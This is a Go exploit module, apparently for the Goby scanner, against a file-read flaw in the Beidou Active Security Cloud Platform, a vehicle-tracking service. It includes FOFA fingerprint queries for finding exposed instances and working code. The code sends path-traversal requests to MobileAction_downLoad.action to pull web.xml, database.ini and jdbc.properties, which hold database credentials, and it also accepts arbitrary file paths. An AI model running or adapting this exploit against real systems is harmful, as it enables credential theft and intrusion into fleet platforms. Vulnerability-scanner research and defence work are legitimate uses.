package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Beidou-Active-Sec-CP MobileAction_downLoad.action File Read vulnerability",
    "Description": "<p>Beidou-Active-Sec-CP is a platform of innovation technology and open operation concept based on vehicle location information service and real-time vehicle video transmission.</p><p>Beidou-Active-Sec-CP MobileAction_downLoad.action File Read vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.</p>",
    "Product": "Beidou-Active-Sec-CP",
    "Homepage": "http://www.g-sky.cn/",
    "DisclosureDate": "2022-07-23",
    "Author": "橘先生",
    "FofaQuery": "body=\"content=\\\"Babelstar\\\"\" || body=\"class=\\\"wy-mod-lang switchMenuItem\\\"\"",
    "GobyQuery": "body=\"content=\\\"Babelstar\\\"\" || body=\"class=\\\"wy-mod-lang switchMenuItem\\\"\"",
    "Level": "2",
    "Impact": "<p>Beidou-Active-Sec-CP MobileAction_downLoad.action File Read vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed. Users are asked to contact the manufacturer to fix the vulnerability: <a href=\"http://www.g-sky.cn/\">http://www.g-sky.cn/</a></p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "database,custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../database.ini",
            "show": "attackType=custom"
        },
        {
            "name": "database",
            "type": "select",
            "value": "database.ini,jdbc.properties",
            "show": "attackType=database"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "北斗主动安全云平台 MobileAction_downLoad.action 文件读取漏洞",
            "Product": "北斗主动安全云平台",
            "Description": "<p>北斗主动安全云平台是基于车辆位置信息服务及车辆视频实时传输报务为基础的创技术及开放运营理念的平台。</p><p>北斗主动安全云平台 MobileAction_downLoad.action 文件读取漏洞，攻击者可利用该漏洞获取系统的敏感信息等。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.g-sky.cn/\" target=\"_blank\">http://www.g-sky.cn/</a></p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>北斗主动安全云平台 MobileAction_downLoad.action 文件读取漏洞，攻击者可利用该漏洞获取系统的敏感信息等。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Beidou-Active-Sec-CP MobileAction_downLoad.action File Read vulnerability",
            "Product": "Beidou-Active-Sec-CP",
            "Description": "<p>Beidou-Active-Sec-CP is a platform of innovation technology and open operation concept based on vehicle location information service and real-time vehicle video transmission.</p><p>Beidou-Active-Sec-CP MobileAction_downLoad.action File Read vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.</p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed. Users are asked to contact the manufacturer to fix the vulnerability: <a href=\"http://www.g-sky.cn/\" target=\"_blank\">http://www.g-sky.cn/</a></p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>Beidou-Active-Sec-CP MobileAction_downLoad.action File Read vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-12-14",
    "PocId": "10896"
}`
	readFileRequest9hj8h754y := func(hostinfo *httpclient.FixUrl, path string) (*httpclient.HttpResponse, error) {
		readFileRequestConfig := httpclient.NewPostRequestConfig("/808gps/api/MobileAction_downLoad.action?path=" + path)
		readFileRequestConfig.VerifyTls = false
		readFileRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostinfo, readFileRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, _ := readFileRequest9hj8h754y(hostinfo, "/WEB-INF/web.xml")
			return resp != nil && strings.Contains(resp.Utf8Html, "<filter-name>") && strings.Contains(resp.Utf8Html, "<servlet-class>")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			var filePath string
			if attackType == "database" && goutils.B2S(ss.Params["database"]) == "database.ini" {
				filePath = "../../../database.ini"
			} else if attackType == "database" && goutils.B2S(ss.Params["database"]) == "jdbc.properties" {
				filePath = "/WEB-INF/classes/config/jdbc.properties"
			} else if attackType == "custom" {
				filePath = goutils.B2S(ss.Params["filePath"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			if resp, err := readFileRequest9hj8h754y(expResult.HostInfo, filePath); resp != nil && resp.Header != nil && strings.Contains(resp.HeaderString.String(), `attachment;filename=`) {
				expResult.Success = true
				expResult.Output = resp.RawBody
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
